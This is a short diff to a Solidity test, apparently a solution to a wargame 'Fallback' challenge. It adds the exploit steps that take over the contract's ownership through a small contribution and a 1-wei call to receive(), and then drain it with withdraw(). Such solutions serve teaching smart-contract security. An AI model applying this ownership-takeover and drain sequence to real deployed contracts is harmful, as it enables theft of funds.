@@ -18,10 +18,13 @@ contract FallbackTest is Test {
         vm.startPrank(student);
         
         // Contribute a small amount (less than 0.001 ether) to the contract
+        fallbackContract.contribute{value: 0.0001 ether}();
 
         // Send ether to the contract trigger receive() and become the owner
-
+        //vm.deal(address(fallbackContract), 1 wei);
+        address(fallbackContract).call{value: 1 wei}("");
         // Withdraw all funds
+        fallbackContract.withdraw();
 
         vm.stopPrank();
     }
